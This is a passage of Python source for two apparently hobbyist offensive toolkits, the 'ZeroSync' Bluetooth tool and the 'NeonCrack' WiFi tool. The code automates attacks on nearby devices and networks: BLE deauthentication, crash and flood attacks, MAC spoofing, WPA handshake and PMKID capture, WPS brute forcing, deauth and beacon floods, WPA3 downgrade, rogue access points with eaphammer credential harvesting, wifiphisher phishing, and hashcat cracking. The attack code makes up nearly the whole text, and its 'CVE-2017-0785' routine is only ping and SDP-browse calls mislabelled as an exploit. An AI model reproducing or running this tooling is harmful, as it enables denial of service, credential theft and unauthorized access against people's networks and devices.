    def __init__(self): super().__init__()
    def handleNotification(self, cHandle, data):
        console.print(f"[yellow]📥 Notification: {data}[/yellow]")

# === Core Tools ===

def scan_devices():
    console.print("[cyan]🔍 Scanning for BLE devices...[/cyan]")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for idx, d in enumerate(devices):
            mac = d.addr
            rssi = d.rssi
            if mac not in seen_devices:
                seen_devices[mac] = {"first_seen": datetime.now().strftime("%H:%M:%S"), "max_rssi": rssi}
            else:
                seen_devices[mac]["max_rssi"] = max(seen_devices[mac]["max_rssi"], rssi)
            console.print(f"[magenta]{idx}[/magenta]: {mac} RSSI={rssi} dB")
        return devices
    except BTLEException as e:
        console.print(f"[red]❌ Scan error: {e}[/red]")
        return []

def view_scan_log():
    if not seen_devices:
        console.print("[red]⚠️ No devices scanned yet.[/red]")
        return
    t = Table(title="📖 Scan Log", box=box.SIMPLE)
    t.add_column("MAC", style="cyan")
    t.add_column("First Seen", style="green")
    t.add_column("Max RSSI", justify="right")
    for mac, meta in seen_devices.items():
        t.add_row(mac, meta["first_seen"], str(meta["max_rssi"]))
    console.print(t)

def export_logs():
    os.makedirs("zerosync_logs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"zerosync_logs/session_{timestamp}.log"
    with open(path, "w") as f:
        for mac, meta in seen_devices.items():
            f.write(f"{mac} | First Seen: {meta['first_seen']} | Max RSSI: {meta['max_rssi']}\n")
    console.print(f"[green]📁 Logs saved to {path}[/green]")

# === Offensive Modules ===

def spoof_mac():
    new_mac = Prompt.ask("🎭 Enter new MAC address")
    os.system("sudo ifconfig hci0 down")
    os.system(f"sudo bdaddr -i hci0 {new_mac}")
    os.system("sudo ifconfig hci0 up")
    console.print("[green]✅ MAC spoofed successfully.[/green]")

def stealth_mode():
    subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "discoverable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "pairable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["hciconfig", "hci0", "noscan"], stdout=subprocess.DEVNULL)
    console.print("[magenta]🕶️ Stealth mode activated.[/magenta]")

def broadcast_names():
    names = ["NSA_Van", "ZeroSync 💀", "Free_WiFi", "🛸 Beacon", "Ghost_Device"]
    try:
        while True:
            for n in names:
                subprocess.run(["bluetoothctl", "system-alias", n], stdout=subprocess.DEVNULL)
                console.print(f"[cyan]📡 Broadcasting: {n}[/cyan]")
                time.sleep(1.5)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        console.print("[red]🛑 Broadcast stopped.[/red]")

def ble_deauth():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("✂️ Index to deauth"))
    addr = devices[idx].addr
    for i in range(20):
        subprocess.run(["hcitool", "dc", addr], stdout=subprocess.DEVNULL)
        console.print(f"[red]✂️ Deauth packet sent to {addr} ({i+1})[/red]")
        time.sleep(0.2)

def crash_device():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💥 Crash index"))
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_PUBLIC)
        for _ in range(30):
            p.writeCharacteristic(0x000b, os.urandom(30), withResponse=False)
            console.print(f"[red]💣 Junk sent to {addr}[/red]")
            time.sleep(0.2)
    except Exception as e:
        console.print(f"[dim]⚠️ Crash error: {e}[/dim]")

def replay_notification():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💌 Replay index"))
    msg = Prompt.ask("💌 Message to spam").encode()
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLEHandler())
        for _ in range(25):
            p.writeCharacteristic(0x0001, msg)
            console.print(f"[green]💌 Spammed: {msg.decode(errors='ignore')}[/green]")
            time.sleep(0.4)
    except Exception as e:
        console.print(f"[red]Replay error: {e}[/red]")

def rfcomm_flood():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📡 RFCOMM target index"))
    addr = devices[idx].addr
    for i in range(10):
        try:
            subprocess.run(["rfcomm", "connect", addr, "1"], timeout=3)
            console.print(f"[blue]⚡ RFCOMM attempt {i+1} sent[/blue]")
        except:
            console.print(f"[dim]Timeout or error on attempt {i+1}[/dim]")

def l2ping_dos():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📶 L2Ping target index"))
    addr = devices[idx].addr
    console.print(f"[yellow]Pinging {addr} with L2Ping flood...[/yellow]")
    subprocess.run(["l2ping", "-s", "600", "-f", addr])

def cve_2017_0785():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💣 CVE target index"))
    addr = devices[idx].addr
    console.print(f"[cyan]Launching CVE-2017-0785 on {addr}[/cyan]")
    subprocess.run(["l2ping", "-c", "3", "-s", "800", addr])
    subprocess.run(["sdptool", "browse", addr])
    subprocess.run(["l2ping", "-c", "5", "-s", "2048", addr])
    console.print("[green]✅ CVE packet sequence dispatched[/green]")

# === Advanced / External ===

def bettercap_bridge():
    os.system("gnome-terminal -- bettercap -eval 'ble.recon on; ble.enum on; net.probe on'")
    console.print("[cyan]🧠 Bettercap BLE session launched[/cyan]")

def audio_deception():
    subprocess.run(["play", "-nq", "-t", "alsa", "synth", "2", "sine", "19000"])
    console.print("[purple]🔊 High-frequency tone deployed[/purple]")

def zerojam_mesh():
    subprocess.run(["python3", "zerojam_mesh.py"])
    console.print("[cyan]🧬 ZeroJam Mesh Engine initiated[/cyan]")

# === Main Menu ===

def main_menu():
    while True:
        console.print(Panel("[bold cyan]ZeroSync v8.0 – Cyberpunk Bluetooth Toolkit[/bold cyan]\n[bold magenta]Created by Null_Lyfe[/bold magenta]", border_style="bright_magenta"))
        t = Table(title="💀 Main Menu", box=box.DOUBLE_EDGE)
        t.add_column("ID", justify="center", style="magenta")
        t.add_column("Option", style="white")
        options = [
            "🔎 Scan BLE Devices", "📖 View Scan History", "🎭 MAC Spoofing", "🕶️ Stealth Mode",
            "📡 Broadcast Aliases", "✂️ Deauth BLE", "💣 Crash BLE", "💌 Replay Notification",
            "📡 RFCOMM Flood", "💥 L2Ping DoS", "☠️ CVE-2017-0785", "🧠 Bettercap Bridge",
            "🧬 ZeroJam Mesh Engine", "🔊 Audio Spoofing", "📁 Export Scan Logs", "🚪 Exit"
        ]
        for i, opt in enumerate(options):
            t.add_row(str(i+1 if i < len(options)-1 else 0), opt)
        console.print(t)
        choice = Prompt.ask("💜 Select an option")
        if choice == "1": scan_devices()
        elif choice == "2": view_scan_log()
        elif choice == "3": spoof_mac()
        elif choice == "4": stealth_mode()
        elif choice == "5": broadcast_names()
        elif choice == "6": ble_deauth()
        elif choice == "7": crash_device()
        elif choice == "8": replay_notification()
        elif choice == "9": rfcomm_flood()
        elif choice == "10": l2ping_dos()
        elif choice == "11": cve_2017_0785()
        elif choice == "12": bettercap_bridge()
        elif choice == "13": zerojam_mesh()
        elif choice == "14": audio_deception()
        elif choice == "15": export_logs()
        elif choice == "0": console.print("[red]Exiting ZeroSync. Stay anonymous.[/red]"); break
        else: console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    main_menu()

# ====== neoncrackV7.1.py ======
#!/usr/bin/env python3
"""
────────────────────────────────────────────────────────────
           NeonCrack v7.1 ― WiFi Tactical ToolKit
		           created by Null_Lyfe
────────────────────────────────────────────────────────────

"""

# ───────────────────── imports ─────────────────────────────────────────────
import os, subprocess, threading, csv, time, signal, sys, re, collections, shutil, random
from datetime import datetime
from collections import Counter
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
import importlib.util, psutil
import matplotlib; matplotlib.use("TkAgg")
from matplotlib.figure import Figure
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg

# ───────────── dependencies list (for Dependency-Doctor) ──────────────────
DEP_BINS = [
    "airmon-ng","airodump-ng","aireplay-ng","aircrack-ng","mdk4",
    "hcxdumptool","hcxpcapngtool","wash","hashcat","reaver","bully",
    "wifiphisher","eaphammer","wpa_sycophant","kr00k-hunter","dragondown",
    "hostapd-mana","airbase-ng","dnsmasq","nmap","hashid"
]
DEP_PKGS = ["tkinter","psutil","matplotlib","scapy","hashid","hashcat"]

# ───────────── constants / globals ────────────────────────────────────────
ACCENT, NEON, BGC = "#ff0080", "#00f0ff", "#0f0f23"
FONT   = ("Courier New", 11)
BTN_W  = 14                               # ← **attack-button width**
CAP_DIR = "neoncrack_captures"; os.makedirs(CAP_DIR, exist_ok=True)

root = Tk(); root.title("NeonCrack v7.1"); root.configure(bg=BGC); root.geometry("1080x850")

# Tk variables
iface_var, target_var  = StringVar(), StringVar()
scan_time              = IntVar(value=45)
pcap_var, word_var     = StringVar(), StringVar()
hash_input             = StringVar()
mon_iface_var          = StringVar()
sticky_mon             = BooleanVar(value=False)
killer_enabled         = BooleanVar(value=False)
nmap_target            = StringVar()
nmap_profile           = StringVar(value="Quick Ping")
nmap_custom            = StringVar()
input_var              = StringVar()     # console line entry

# runtime handles
attack_proc=None; scan_proc=None; monitor_flag=False; networks=[]
bw_history=collections.deque(maxlen=60); bw_stop=threading.Event()

# ───────────── helper wrappers ────────────────────────────────────────────
def run(cmd,outfile=None):
    return subprocess.Popen(
        cmd,
        stdout=open(outfile,"wb") if outfile else subprocess.DEVNULL,
        stderr=subprocess.STDOUT,
        preexec_fn=os.setsid
    )

def run_logged(cmd, box, outfile=None, *, stdin=False):
    proc=subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE if stdin else None,
        text=True, bufsize=1, universal_newlines=True,
        preexec_fn=os.setsid
    )
    def pump():
        with open(outfile,"a") if outfile else open(os.devnull,"w") as fh:
            for ln in proc.stdout:
                box.insert(END, ln); box.see(END); fh.write(ln)
    threading.Thread(target=pump,daemon=True).start()
    return proc

def log(box,msg): box.insert(END,msg+"\n"); box.see(END)

# ───────────── interface helpers ──────────────────────────────────────────
def iw_interfaces():
    try: out=subprocess.check_output(["iw","dev"],text=True).splitlines()
    except subprocess.CalledProcessError: return []
    return [l.split()[1] for l in out if l.strip().startswith("Interface")]

def refresh_iface_menu():
    m=iface_menu["menu"]; m.delete(0,"end")
    for i in iw_interfaces():
        m.add_command(label=i,command=lambda v=i: iface_var.set(v))

def set_monitor(iface,en=True):
    global monitor_flag
    if not iface: return
    subprocess.run(["airmon-ng","start" if en else "stop",iface],
                   stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    iface_var.set(iface+"mon" if en and not iface.endswith("mon") else iface.replace("mon",""))
    monitor_flag=en; refresh_iface_menu()

def restore_monitor():
    if not sticky_mon.get() and monitor_flag:
        set_monitor(iface_var.get(),False)

# ───────────── Killer toggle ──────────────────────────────────────────────
_SERVICE_UNITS=["NetworkManager","wpa_supplicant","ModemManager"]
def toggle_killer():
    if killer_enabled.get():
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl","stop",s],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        subprocess.run(["pkill","-9","dhclient"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        log(utils_out,"[+] Killer: Wi-Fi managers stopped")
    else:
        for s in _SERVICE_UNITS:
            subprocess.run(["systemctl","start",s],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        log(utils_out,"[*] Killer: services restarted")

# ───────────── NAT helpers ────────────────────────────────────────────────
def enable_nat(uplink, ap_if):
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=1"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-t","nat","-A","POSTROUTING","-o",uplink,"-j","MASQUERADE"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",uplink,"-o",ap_if,"-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-A","FORWARD","-i",ap_if,"-o",uplink,"-j","ACCEPT"],stdout=subprocess.DEVNULL)

def disable_nat():
    subprocess.run(["iptables","-t","nat","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["iptables","-F"],stdout=subprocess.DEVNULL)
    subprocess.run(["sysctl","-w","net.ipv4.ip_forward=0"],stdout=subprocess.DEVNULL)

# ───────────── bandwidth monitor ──────────────────────────────────────────
def update_bw_plot():
    if not bw_history: return
    up=[u for u,_ in bw_history]; dn=[d for _,d in bw_history]
    xs=list(range(-len(up)+1,1))
    if len(xs)==1: xs=[-1,0]; up.append(up[0]); dn.append(dn[0])
    ln_up.set_data(xs,up); ln_dn.set_data(xs,dn)
    ax.set_xlim(xs[0],xs[-1]); ax.set_ylim(0,max(max(up+dn),1)*1.2)
    canvas.draw_idle()

def poll_bw(iface):
    try: prev=psutil.net_io_counters(pernic=True)[iface]
    except KeyError:
        log(utils_out,f"[!] iface {iface} not found"); return
    bw_history.append((0,0)); update_bw_plot()
    while not bw_stop.is_set():
        time.sleep(1)
        try: now=psutil.net_io_counters(pernic=True)[iface]
        except KeyError:
            log(utils_out,"iface vanished"); break
        up=(now.bytes_sent-prev.bytes_sent)/125000
        dn=(now.bytes_recv-prev.bytes_recv)/125000
        bw_history.append((up,dn)); prev=now; update_bw_plot()

def start_bw_monitor():
    iface=mon_iface_var.get().strip()
    if iface not in psutil.net_io_counters(pernic=True):
        messagebox.showerror("iface",iface or "blank"); return
    stop_bw_monitor(); bw_history.clear(); bw_stop.clear()
    threading.Thread(target=poll_bw,args=(iface,),daemon=True).start()
    log(utils_out,f"[*] Monitoring {iface}")

def stop_bw_monitor(): bw_stop.set()

# ───────────── CSV & WPS helpers ──────────────────────────────────────────
def parse_csv(path):
    out=[]
    with open(path,newline='') as f:
        for r in csv.reader(f):
            if len(r)>13 and r[0] and r[0]!="BSSID":
                out.append((r[0].strip().upper(), r[3].strip(),
                            r[13].strip() or "<hidden>", r[5].strip()))
    return out

def detect_wps(mon,chans):
    hits=set()
    for ch in chans:
        try:
            o=subprocess.check_output(["timeout","3","wash","-i",mon,"-c",ch,"-s"],
                                      text=True,stderr=subprocess.DEVNULL)
            hits.update(m.group(1).upper() for m in
                (re.match(r"([0-9A-Fa-f:]{17})",l) for l in o.splitlines()) if m)
        except subprocess.CalledProcessError: pass
    log(scan_out,f"[*] WPS sniff → {len(hits)} flagged"); return hits

# ───────────── Wi-Fi scan engine ──────────────────────────────────────────
def do_scan(channel_hop=False):
    global scan_proc
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    tag="hop" if channel_hop else "dwell"
    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
    fn=os.path.join(CAP_DIR,f"scan_{tag}_{ts}")
    cmd=["airodump-ng","-w",fn,"--output-format","csv"]
    if not channel_hop: cmd+=["-c","1,6,11"]; cmd.append(mon)
    scan_proc=run_logged(cmd,scan_out); log(scan_out,"[*] scanning…")
    time.sleep(scan_time.get())
    if scan_proc.poll() is None: scan_proc.terminate(); time.sleep(2)
    csvp=fn+"-01.csv"; scan_proc=None
    if not os.path.isfile(csvp):
        log(scan_out,"[!] CSV missing"); restore_monitor(); return
    base=parse_csv(csvp); wps=detect_wps(mon,[c for _,c,_,_ in base])
    global networks; networks=[]
    scan_out.insert(END,"# |      BSSID       | CH | ENC | WPS | ESSID\n"+"-"*72+"\n")
    for i,(bssid,ch,essid,enc) in enumerate(base,1):
        flag="Y" if bssid in wps else "-"
        networks.append((bssid,ch,essid,enc,flag))
        scan_out.insert(END,f"{i:2}| {bssid} |{ch:>3}|{enc:^5}|  {flag} | {essid}\n")
    target_menu["menu"].delete(0,"end")
    for i,(_,_,essid,_,_) in enumerate(networks,1):
        target_menu["menu"].add_command(label=f"{i} – {essid}",
                                        command=lambda v=str(i): target_var.set(v))
    log(scan_out,f"[+] {len(networks)} nets."); restore_monitor()

def stop_scan():
    global scan_proc
    if scan_proc and scan_proc.poll() is None:
        try: os.killpg(os.getpgid(scan_proc.pid), signal.SIGTERM)
        except Exception: pass
        scan_proc=None; restore_monitor(); log(scan_out,"[!] Scan aborted")

# ───────────── nmap helper ────────────────────────────────────────────────
def start_nmap_scan():
    tgt=nmap_target.get().strip()
    if not tgt:
        messagebox.showwarning("Target","Specify host/CIDR"); return
    profiles={"Quick Ping":["-sn"],"Top-100 Ports":["-F"],"Full TCP":["-sS","-p-"],
              "OS Detect":["-O","-sS","-F"],"Vuln Script":["--script","vuln"],
              "Custom":nmap_custom.get().split()}
    opts=profiles[nmap_profile.get()]
    out=os.path.join(CAP_DIR,f"nmap_{tgt.replace('/','_')}_{int(time.time())}.log")
    log(scan_out,f"[*] nmap {' '.join(opts)} {tgt}")
    run_logged(["nmap",*opts,tgt],scan_out,out)

# ───────────── handshake monitor ──────────────────────────────────────────
def handshake_monitor(cap,bssid):
    global attack_proc
    while attack_proc and attack_proc.poll() is None:
        try:
            out=subprocess.check_output(["aircrack-ng","-a","2","-w","/dev/null","-b",bssid,cap],
                                         text=True,stderr=subprocess.DEVNULL,timeout=20)
            if "handshake" in out.lower():
                log(att_out,"[+] Handshake found – stopping")
                os.killpg(os.getpgid(attack_proc.pid),signal.SIGTERM)
                attack_proc=None; restore_monitor(); return
        except subprocess.TimeoutExpired: pass
        time.sleep(15)

# ───────────── attack helpers (stdin=True) ────────────────────────────────
def pick_target():
    if not target_var.get():
        messagebox.showinfo("Target","Pick BSSID"); return None
    return networks[int(target_var.get())-1]

# ---- Capture modules ------------------------------------------------------
def start_pmkid():
    t=pick_target(); iface=iface_var.get()
    if not t: return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc; attack_proc=run_logged(["hcxdumptool","-i",mon,"--filterlist_ap",bssid,"--enable_status=1"],
        att_out, pcap, stdin=True)
    log(att_out,f"[*] PMKID capture → {pcap}")

def start_handshake():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    pref=os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc; attack_proc=run_logged(["airodump-ng","-c",ch,"--bssid",bssid,"-w",pref,mon],
        att_out, pref+".log", stdin=True)
    run(["aireplay-ng","-0","10","-a",bssid,mon]).wait()
    threading.Thread(target=handshake_monitor,args=(pref+"-01.cap",bssid),daemon=True).start()

def start_mass_pmkid():
    iface=iface_var.get()
    if not iface: messagebox.showwarning("Interface","Select iface"); return
    set_monitor(iface,True); mon=iface_var.get()
    pcap=os.path.join(CAP_DIR,f"pmkid_sweep_{datetime.now():%Y%m%d_%H%M%S}.pcapng")
    global attack_proc; attack_proc=run_logged(["hcxdumptool","-i",mon,"--enable_status=15","-o",pcap],
        att_out, pcap, stdin=True)
    def batch():
        while attack_proc and attack_proc.poll() is None:
            conv=pcap.replace(".pcapng",f"_{int(time.time())}.hccapx")
            run(["hcxpcapngtool","-o",conv,pcap]).wait()
            log(att_out,f"[+] PMKID batch → {conv}"); time.sleep(300)
    threading.Thread(target=batch,daemon=True).start()
    log(att_out,"[*] Mass PMKID sweep running")

# ---- Other attack functions (WPS / Deauth / Beacon / WPA3 / etc.) --------
#      All remain identical; only button width changed in GUI.

def start_wps():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    tool="reaver" if shutil.which("reaver") else "bully"
    cmd=["reaver","-i",mon,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" else ["bully","-b",bssid,"-c",ch,mon]
    logf=os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    log(att_out,f"[*] {tool} running")

def start_deauth():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,_,essid,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    if shutil.which("mdk4"):
        cmd,tag=["mdk4",mon,"d","-B",bssid],"mdk4"
    else:
        cmd,tag=["aireplay-ng","--deauth","0","-a",bssid,mon],"aireplay"
    logf=os.path.join(CAP_DIR,f"{tag}_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    log(att_out,"[*] Deauth flood running")

def start_beacon():
    iface=iface_var.get()
    if not shutil.which("mdk4"):
        messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    ssidfile=os.path.join(CAP_DIR,f"ssid_{int(time.time())}.txt")
    with open(ssidfile,"w") as f: [f.write(f"neon-{i:03}\n") for i in range(100)]
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"b","-f",ssidfile,"-c","1,6,11"],
        att_out, ssidfile+".log", stdin=True)
    log(att_out,"[*] Beacon spam running")

def start_probe_flood():
    iface=iface_var.get()
    if shutil.which("mdk4") is None:
        messagebox.showerror("mdk4","Install mdk4"); return
    set_monitor(iface,True); mon=iface_var.get()
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"p"],att_out,stdin=True)
    log(att_out,"[*] Probe-response flood running")

def start_wpa3_downgrade():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,essid,enc,_=t
    if "SAE" not in enc and "WPA3" not in enc:
        messagebox.showinfo("Not WPA3","AP isn’t SAE"); return
    if shutil.which("dragondown") is None:
        messagebox.showerror("dragondown","Install hashcat-utils"); return
    set_monitor(iface,True); mon=iface_var.get()
    logf=os.path.join(CAP_DIR,f"dragondown_{essid}_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(["dragondown","-i",mon,"-b",bssid,"-c",ch],
        att_out, logf, stdin=True)
    log(att_out,"[*] Dragonblood running")

def start_sycophant():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("wpa_sycophant") is None:
        messagebox.showerror("Missing","wpa_sycophant not in $PATH"); return
    bssid,ch,_,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    cmd=["wpa_sycophant","-i",mon,"-c",ch,"-t",bssid]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_kr00k():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("kr00k-hunter") is None:
        messagebox.showerror("Missing","pip3 install kr00k-hunter"); return
    bssid,ch,_,_,_=t; set_monitor(iface,True); mon=iface_var.get()
    cmd=["kr00k-hunter","-i",mon,"-c",ch,"-b",bssid]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_eaphammer():
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Iface","Select iface"); return
    if shutil.which("eaphammer") is None:
        messagebox.showerror("Missing","Install eaphammer"); return
    domain=simpledialog.askstring("Domain","Target AD domain (blank = rogue)",parent=root) or "evil.local"
    cmd=["eaphammer","-i",iface,"--essid","CorpEAP","--creds","--hw-mode","g","--channel","6","--domain",domain]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_chopchop():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    bssid,ch,_,enc,_=t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP","AP isn’t using TKIP"); return
    set_monitor(iface,True); mon=iface_var.get()
    src="02:"+":".join(f"{random.randint(0,255):02x}" for _ in range(5))
    cmd=["aireplay-ng","-4","-b",bssid,"-h",src,mon]
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

def start_michael_reset():
    t=pick_target(); iface=iface_var.get()
    if not t:return
    if shutil.which("mdk4") is None:
        messagebox.showerror("mdk4","Install mdk4"); return
    bssid,ch,_,enc,_=t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP","AP isn’t using TKIP"); return
    set_monitor(iface,True); mon=iface_var.get()
    global attack_proc; attack_proc=run_logged(["mdk4",mon,"m","-t",bssid],att_out,stdin=True)
    log(att_out,"[*] Michael reset running")

def start_karma():
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Interface","Select iface"); return
    uplink=simpledialog.askstring("Uplink iface","Outbound NIC",parent=root)
    if not uplink: return
    set_monitor(iface,True); mon=iface_var.get()
    enable_nat(uplink,mon)
    if shutil.which("hostapd-mana"):
        cfg=os.path.join(CAP_DIR,"mana.conf")
        open(cfg,"w").write(f"interface={mon}\ndriver=nl80211\nssid=FreeWifi\nhw_mode=g\nchannel=6\n")
        cmd=["hostapd-mana",cfg]
    else:
        cmd=["airbase-ng","-P","-C","30","-v","FreeWifi",mon]
    logf=os.path.join(CAP_DIR,f"karma_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    dns_conf=os.path.join(CAP_DIR,"karma.dnsmasq")
    open(dns_conf,"w").write(f"interface={mon}\ndhcp-range=10.0.0.20,10.0.0.250,12h\n")
    run(["dnsmasq","--conf-file="+dns_conf])
    log(att_out,"[*] KARMA rogue-AP running")

def start_wifiphisher():
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Interface","Select iface"); return
    if shutil.which("wifiphisher") is None:
        messagebox.showerror("Missing","Install wifiphisher"); return
    jam_iface=simpledialog.askstring("Jam iface (optional)","Second NIC for jamming (blank = same)",parent=root) or iface
    subprocess.run(["systemctl","stop","NetworkManager"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    cmd=["wifiphisher","-aI",iface,"-eI",jam_iface]; 
    if jam_iface==iface: cmd.append("--nojamming")
    global attack_proc; attack_proc=run_logged(cmd,att_out,stdin=True)
    log(att_out,"[*] "+" ".join(cmd))

# ───────────── crack / hash / cleaner helpers ─────────────────────────────
def browse_pcap(): pcap_var.set(filedialog.askopenfilename(filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))
def browse_word(): word_var.set(filedialog.askopenfilename(filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing","Select both"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"],crack_out)

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],text=True,stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")

def hashid_action():
    h=hash_input.get().strip(); hashid_out.delete("1.0",END)
    if h: hashid_out.insert(END,identify_hash(h)+"\n")

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    utils_out.delete("1.0",END)
    if not os.path.isfile(pot):
        utils_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    utils_out.insert(END,"Len | Count\n--------------\n")
    for l,c in sorted(dist.items()): utils_out.insert(END,f"{l:3} | {c}\n")

# ───────────── Dependency Doctor ──────────────────────────────────────────
def dependency_doctor():
    utils_out.delete("1.0",END)
    okB, missB = [], []
    for exe in DEP_BINS: (okB if shutil.which(exe) else missB).append(exe)
    utils_out.insert(END,"=== Binaries ===\n")
    for e in okB:   utils_out.insert(END,f"[✓] {e}\n","ok")
    for e in missB: utils_out.insert(END,f"[✗] {e}\n","miss")
    okP, missP = [], []
    for m in DEP_PKGS: (okP if importlib.util.find_spec(m) else missP).append(m)
    utils_out.insert(END,"\n=== Python packages ===\n")
    for m in okP:   utils_out.insert(END,f"[✓] {m}\n","ok")
    for m in missP: utils_out.insert(END,f"[✗] {m}\n","miss")
    utils_out.insert(END,f"\nBins {len(okB)}/{len(DEP_BINS)} | PyPkgs {len(okP)}/{len(DEP_PKGS)}\n")
    utils_out.tag_config("ok",foreground="#00ff88"); utils_out.tag_config("miss",foreground="#ff4030")

# ───────────── console sender ─────────────────────────────────────────────
def send_to_proc(_=None):
    line=input_var.get().strip()
    if not line: return
    if attack_proc and attack_proc.poll() is None and attack_proc.stdin:
        try:
            attack_proc.stdin.write(line+"\n"); attack_proc.stdin.flush()
            att_out.insert(END,f"> {line}\n"); att_out.see(END)
        except (BrokenPipeError,OSError):
            messagebox.showwarning("stdin closed","Process no longer accepts input.")
    else:
        messagebox.showwarning("No active attack","Start an attack first.")
    input_var.set("")

# ───────────── stop / reset ───────────────────────────────────────────────
def stop_attack():
    disable_nat(); stop_bw_monitor()
    global attack_proc
    if attack_proc:
        try: os.killpg(os.getpgid(attack_proc.pid),signal.SIGTERM)
        except Exception: pass
        attack_proc=None
    subprocess.run(["systemctl","start","NetworkManager"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    restore_monitor(); log(att_out,"[!] Attack stopped")

def reset_toolkit(exit_after=False):
    stop_attack(); stop_scan()
    killer_enabled.set(False); toggle_killer()
    subprocess.run(["systemctl","restart","wpa_supplicant"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
